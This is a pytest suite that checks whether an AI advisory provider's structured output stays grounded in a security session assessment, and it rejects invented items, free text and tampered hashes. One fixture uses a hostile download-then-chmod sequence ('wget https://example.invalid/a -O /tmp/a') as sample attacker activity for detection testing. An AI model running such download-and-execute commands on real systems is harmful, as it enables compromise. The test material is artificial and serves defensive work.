from __future__ import annotations

import copy
import json
from pathlib import Path

import pytest

from production.ai_advisory.contracts import AIAdvisoryContractError
from production.ai_advisory.contracts_v2 import (
    FROZEN_POLICY_SHA256,
    build_deterministic_abstention_v2,
    contract_schema_sha256_v2,
    load_ai_advisory_policy_v2,
    provider_output_json_schema_v2,
    validate_provider_output_v2,
    validate_validated_output_v2,
)
from production.ai_advisory.projection import build_ai_advisory_projection_v2
from production.ai_advisory.security import AssessmentAliasScope
from production.reporting.session_assessment_v6 import build_session_assessment_v6
from tests.test_cross_family_relationship_evaluation import (
    BEHAVIOR_POLICY,
    CLASSIFICATION_POLICY,
    _payload,
)
from tests.test_final_f_phase3_projection_v2 import (
    PROJECTION_CONTRACT,
    _assessment,
    _projection,
    _scope,
)


POLICY = "configs/ai_advisory_policy.v2.json"
KNOWN_ANSWER = (
    Path(__file__).resolve().parents[1]
    / "evaluation"
    / "final_f_phase4_contract_known_answer.v2.json"
)


def _context():
    report = _assessment("phase4-contract")
    scope = _scope(report)
    projection = _projection(report, scope)
    return report, scope, projection


def _valid_provider_output(projection: dict) -> dict:
    chain = projection["chains"][0]
    finding = projection["findings"][0]
    action = projection["actions"][0]
    chain_id = chain["chain_id"]
    finding_id = finding["finding_id"]
    action_id = action["action_id"]
    return {
        "schema_version": "ai_provider_output.v2",
        "projection_sha256": projection["projection_sha256"],
        "policy_sha256": FROZEN_POLICY_SHA256,
        "synthesis": {
            "schema_version": "ai_advisory_synthesis_selection.v2",
            "abstained": False,
            "abstention_reason_code": "",
            "selected_chain_ids": [chain_id],
            "selected_relationship_ids": list(chain["relationship_ids"]),
            "ranked_finding_ids": [finding_id],
            "selected_hypothesis_ids": [],
            "ranked_action_ids": [action_id],
            "selected_limitation_codes": ["relationship_not_causal_proof"],
            "selected_evidence_gap_codes": [],
            "analyst_question_selections": [],
            "explanation_template_selections": [
                {
                    "template_id": "explain_chain_and_limits",
                    "anchor_type": "chain",
                    "anchor_id": chain_id,
                },
                {
                    "template_id": "explain_manual_checks",
                    "anchor_type": "action",
                    "anchor_id": action_id,
                },
            ],
            "review_plan": [
                {
                    "order": 1,
                    "step_type": "review_chain",
                    "anchor_type": "chain",
                    "anchor_id": chain_id,
                    "related_chain_ids": [chain_id],
                    "related_finding_ids": [finding_id],
                    "related_hypothesis_ids": [],
                    "related_action_ids": [],
                    "limitation_codes": ["relationship_not_causal_proof"],
                    "evidence_gap_codes": [],
                    "analyst_question_template_ids": [],
                    "explanation_template_id": "explain_chain_and_limits",
                },
                {
                    "order": 2,
                    "step_type": "perform_manual_check",
                    "anchor_type": "action",
                    "anchor_id": action_id,
                    "related_chain_ids": [chain_id],
                    "related_finding_ids": [finding_id],
                    "related_hypothesis_ids": [],
                    "related_action_ids": [action_id],
                    "limitation_codes": [],
                    "evidence_gap_codes": [],
                    "analyst_question_template_ids": [],
                    "explanation_template_id": "explain_manual_checks",
                },
            ],
        },
    }


def _validate(raw: dict, report, scope, projection):
    return validate_provider_output_v2(
        raw,
        projection=projection,
        report=report,
        alias_scope=scope,
        policy_path=POLICY,
        projection_contract_path=PROJECTION_CONTRACT,
    )


def test_frozen_policy_and_provider_schema_are_exact_and_shadow_free() -> None:
    policy, sha, _ = load_ai_advisory_policy_v2(POLICY)
    assert sha == FROZEN_POLICY_SHA256
    schema = provider_output_json_schema_v2(policy)
    assert schema["additionalProperties"] is False
    assert set(schema["properties"]) == {
        "schema_version", "projection_sha256", "policy_sha256", "synthesis"
    }
    serialized = json.dumps(schema, sort_keys=True)
    assert "shadow_candidates" not in serialized
    assert "free_text" not in serialized
    assert contract_schema_sha256_v2(policy) == (
        "f181765e38a65de53bf1870c6d0b217dae9c508f66121164fbe5eb0017375a4c"
    )


def test_policy_bytes_are_phase0_identical_and_tampering_fails_closed(tmp_path) -> None:
    config = open(POLICY, "rb").read()
    proposed = open(
        "evaluation/final_f_ai_advisory_policy.v2.proposed.json", "rb"
    ).read()
    assert config == proposed
    changed = json.loads(config)
    changed["authority"]["finding_authority"] = True
    path = tmp_path / "changed-policy.json"
    path.write_text(json.dumps(changed), encoding="utf-8")
    with pytest.raises(AIAdvisoryContractError, match="identity mismatch"):
        load_ai_advisory_policy_v2(path)


def test_valid_whole_session_synthesis_normalizes_and_content_binds() -> None:
    report, scope, projection = _context()
    validated = _validate(
        _valid_provider_output(projection), report, scope, projection
    )
    assert validated["schema_version"] == "ai_advisory_validated_output.v2"
    assert validated["validation_status"] == "accepted"
    assert validated["selection_origin"] == "provider"
    assert validated["synthesis"]["abstained"] is False
    assert [item["order"] for item in validated["synthesis"]["review_plan"]] == [1, 2]
    assert validate_validated_output_v2(
        validated,
        projection=projection,
        report=report,
        alias_scope=scope,
        policy_path=POLICY,
        projection_contract_path=PROJECTION_CONTRACT,
    ) == validated
    assert "shadow_candidates" not in json.dumps(validated)


@pytest.mark.parametrize(
    ("field", "value"),
    (
        ("selected_chain_ids", ["a_" + "0" * 32]),
        ("selected_relationship_ids", ["a_" + "1" * 32]),
        ("ranked_finding_ids", ["a_" + "2" * 32]),
        ("selected_hypothesis_ids", ["a_" + "3" * 32]),
        ("ranked_action_ids", ["a_" + "4" * 32]),
        ("selected_limitation_codes", ["invented_limitation"]),
        ("selected_evidence_gap_codes", ["invented_gap"]),
    ),
)
def test_invented_projected_objects_and_codes_are_rejected(field, value) -> None:
    report, scope, projection = _context()
    raw = _valid_provider_output(projection)
    raw["synthesis"][field] = value
    with pytest.raises(AIAdvisoryContractError, match="invented"):
        _validate(raw, report, scope, projection)


@pytest.mark.parametrize("location", ["top", "synthesis", "plan", "shadow"])
def test_unknown_free_form_and_shadow_fields_are_rejected(location: str) -> None:
    report, scope, projection = _context()
    raw = _valid_provider_output(projection)
    if location == "top":
        raw["free_text"] = "invent a factual conclusion"
    elif location == "synthesis":
        raw["synthesis"]["rationale"] = "attacker intent"
    elif location == "plan":
        raw["synthesis"]["review_plan"][0]["description"] = "run a command"
    else:
        raw["shadow_candidates"] = {"candidates": []}
    with pytest.raises(AIAdvisoryContractError):
        _validate(raw, report, scope, projection)


def test_non_json_provider_value_fails_closed() -> None:
    report, scope, projection = _context()
    raw = _valid_provider_output(projection)
    raw["synthesis"]["review_plan"] = {object()}
    with pytest.raises(AIAdvisoryContractError, match="not JSON"):
        _validate(raw, report, scope, projection)


def test_stale_projection_policy_and_report_identities_are_rejected() -> None:
    report, scope, projection = _context()
    raw = _valid_provider_output(projection)
    raw["projection_sha256"] = "f" * 64
    with pytest.raises(AIAdvisoryContractError, match="projection hash"):
        _validate(raw, report, scope, projection)

    raw = _valid_provider_output(projection)
    raw["policy_sha256"] = "f" * 64
    with pytest.raises(AIAdvisoryContractError, match="policy hash"):
        _validate(raw, report, scope, projection)

    newer = _assessment("phase4-newer-report")
    with pytest.raises(AIAdvisoryContractError, match="scope is stale"):
        validate_provider_output_v2(
            _valid_provider_output(projection),
            projection=projection,
            report=newer,
            alias_scope=scope,
            policy_path=POLICY,
            projection_contract_path=PROJECTION_CONTRACT,
        )


def test_duplicate_unrelated_and_ungrounded_selections_are_rejected() -> None:
    report, scope, projection = _context()
    raw = _valid_provider_output(projection)
    raw["synthesis"]["ranked_finding_ids"] *= 2
    with pytest.raises(AIAdvisoryContractError, match="duplicates"):
        _validate(raw, report, scope, projection)

    chain_relationships = set(projection["chains"][0]["relationship_ids"])
    extra = next(
        item["relationship_id"] for item in projection["relationships"]
        if item["relationship_id"] not in chain_relationships
    )
    raw = _valid_provider_output(projection)
    raw["synthesis"]["selected_relationship_ids"].append(extra)
    with pytest.raises(AIAdvisoryContractError, match="not grounded"):
        _validate(raw, report, scope, projection)

    raw = _valid_provider_output(projection)
    raw["synthesis"]["ranked_finding_ids"] = []
    raw["synthesis"]["review_plan"][0]["related_finding_ids"] = []
    raw["synthesis"]["review_plan"][1]["related_finding_ids"] = []
    with pytest.raises(AIAdvisoryContractError, match="action is not finding-grounded"):
        _validate(raw, report, scope, projection)


@pytest.mark.parametrize("mutation", ["order", "anchor", "related", "coverage", "explanation"])
def test_review_plan_is_closed_contiguous_selected_and_fully_grounded(mutation: str) -> None:
    report, scope, projection = _context()
    raw = _valid_provider_output(projection)
    if mutation == "order":
        raw["synthesis"]["review_plan"][1]["order"] = 3
    elif mutation == "anchor":
        raw["synthesis"]["review_plan"][0]["anchor_id"] = "a_" + "0" * 32
    elif mutation == "related":
        raw["synthesis"]["review_plan"][0]["related_finding_ids"] = [
            "a_" + "0" * 32
        ]
    elif mutation == "coverage":
        raw["synthesis"]["review_plan"].pop()
    else:
        raw["synthesis"]["review_plan"][0]["explanation_template_id"] = (
            "explain_manual_checks"
        )
    with pytest.raises(AIAdvisoryContractError):
        _validate(raw, report, scope, projection)


def test_provider_and_deterministic_abstention_are_empty_and_distinct() -> None:
    report, scope, projection = _context()
    raw = _valid_provider_output(projection)
    synthesis = raw["synthesis"]
    synthesis.update({
        "abstained": True,
        "abstention_reason_code": "insufficient_synthesis_context",
        "selected_chain_ids": [], "selected_relationship_ids": [],
        "ranked_finding_ids": [], "selected_hypothesis_ids": [],
        "ranked_action_ids": [], "selected_limitation_codes": [],
        "selected_evidence_gap_codes": [], "analyst_question_selections": [],
        "explanation_template_selections": [], "review_plan": [],
    })
    provider = _validate(raw, report, scope, projection)
    assert provider["selection_origin"] == "provider"
    assert provider["synthesis"]["abstained"] is True

    deterministic = build_deterministic_abstention_v2(
        projection=projection,
        report=report,
        alias_scope=scope,
        reason_code="insufficient_synthesis_context",
        policy_path=POLICY,
        projection_contract_path=PROJECTION_CONTRACT,
    )
    assert deterministic["selection_origin"] == "deterministic_no_call"
    assert deterministic["synthesis"] == provider["synthesis"]
    assert deterministic["validated_output_sha256"] != provider[
        "validated_output_sha256"
    ]

    invalid = copy.deepcopy(raw)
    invalid["synthesis"]["selected_chain_ids"] = [
        projection["chains"][0]["chain_id"]
    ]
    with pytest.raises(AIAdvisoryContractError, match="no selections"):
        _validate(invalid, report, scope, projection)
    with pytest.raises(AIAdvisoryContractError, match="not allowed"):
        build_deterministic_abstention_v2(
            projection=projection,
            report=report,
            alias_scope=scope,
            reason_code="invented_reason",
            policy_path=POLICY,
            projection_contract_path=PROJECTION_CONTRACT,
        )


def test_validated_output_tampering_fails_closed() -> None:
    report, scope, projection = _context()
    validated = _validate(
        _valid_provider_output(projection), report, scope, projection
    )
    changed = copy.deepcopy(validated)
    changed["synthesis"]["review_plan"][0]["order"] = 2
    with pytest.raises(AIAdvisoryContractError):
        validate_validated_output_v2(
            changed,
            projection=projection,
            report=report,
            alias_scope=scope,
            policy_path=POLICY,
            projection_contract_path=PROJECTION_CONTRACT,
        )


def test_partial_chain_hypothesis_question_and_gap_are_graph_grounded() -> None:
    payload = _payload({
        "case_id": "phase4-hypothesis",
        "events": [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
        ],
    })
    report = build_session_assessment_v6(
        [payload], raw_events=payload["raw_events"],
        behavior_policy_path=str(BEHAVIOR_POLICY),
        classification_policy_path=str(CLASSIFICATION_POLICY),
    )
    scope = AssessmentAliasScope(
        b"phase-4-hypothesis-alias-key!!!!", "phase4-provider",
        report["assessment_id"],
    )
    projection = build_ai_advisory_projection_v2(
        report, alias_scope=scope, ai_policy_path=POLICY,
        projection_contract_path=PROJECTION_CONTRACT,
    )
    chain = projection["chains"][0]
    hypothesis = projection["hypotheses"][0]
    finding_ids = [item["finding_id"] for item in projection["findings"]]
    action = projection["actions"][0]
    gap = "execution_observation_missing"
    raw = {
        "schema_version": "ai_provider_output.v2",
        "projection_sha256": projection["projection_sha256"],
        "policy_sha256": FROZEN_POLICY_SHA256,
        "synthesis": {
            "schema_version": "ai_advisory_synthesis_selection.v2",
            "abstained": False,
            "abstention_reason_code": "",
            "selected_chain_ids": [chain["chain_id"]],
            "selected_relationship_ids": list(chain["relationship_ids"]),
            "ranked_finding_ids": finding_ids,
            "selected_hypothesis_ids": [hypothesis["hypothesis_id"]],
            "ranked_action_ids": [action["action_id"]],
            "selected_limitation_codes": ["relationship_not_causal_proof"],
            "selected_evidence_gap_codes": [gap],
            "analyst_question_selections": [{
                "template_id": "ask_for_execution_corroboration",
                "anchor_type": "hypothesis",
                "anchor_id": hypothesis["hypothesis_id"],
            }],
            "explanation_template_selections": [{
                "template_id": "explain_hypothesis_test",
                "anchor_type": "hypothesis",
                "anchor_id": hypothesis["hypothesis_id"],
            }],
            "review_plan": [
                {
                    "order": 1,
                    "step_type": "test_existing_hypothesis",
                    "anchor_type": "hypothesis",
                    "anchor_id": hypothesis["hypothesis_id"],
                    "related_chain_ids": [chain["chain_id"]],
                    "related_finding_ids": finding_ids,
                    "related_hypothesis_ids": [hypothesis["hypothesis_id"]],
                    "related_action_ids": [action["action_id"]],
                    "limitation_codes": ["relationship_not_causal_proof"],
                    "evidence_gap_codes": [gap],
                    "analyst_question_template_ids": [
                        "ask_for_execution_corroboration"
                    ],
                    "explanation_template_id": "explain_hypothesis_test",
                }
            ],
        },
    }
    validated = _validate(raw, report, scope, projection)
    assert validated["synthesis"]["selected_hypothesis_ids"] == [
        hypothesis["hypothesis_id"]
    ]

    wrong = copy.deepcopy(raw)
    wrong["synthesis"]["analyst_question_selections"][0]["template_id"] = (
        "ask_to_resolve_entity_identity"
    )
    wrong["synthesis"]["review_plan"][0]["analyst_question_template_ids"] = [
        "ask_to_resolve_entity_identity"
    ]
    with pytest.raises(AIAdvisoryContractError, match="unrelated"):
        _validate(wrong, report, scope, projection)


def test_frozen_phase4_known_answer_validates_exactly(monkeypatch) -> None:
    expected = json.loads(KNOWN_ANSWER.read_text(encoding="utf-8"))
    import production.reporting.session_assessment_v4 as assessment_v4

    monkeypatch.setattr(
        assessment_v4, "_git_revision",
        lambda: expected["implementation_commit"],
    )
    report = _assessment(expected["case_id"])
    scope = _scope(report)
    projection = _projection(report, scope)
    assert report["assessment_id"] == expected["assessment_id"]
    assert projection["projection_sha256"] == expected["projection_sha256"]
    validated = _validate(
        expected["provider_output"], report, scope, projection
    )
    assert validated["validated_output_sha256"] == expected[
        "expected_validated_output_sha256"
    ]
    policy, _, _ = load_ai_advisory_policy_v2(POLICY)
    assert contract_schema_sha256_v2(policy) == expected[
        "provider_output_schema_sha256"
    ]
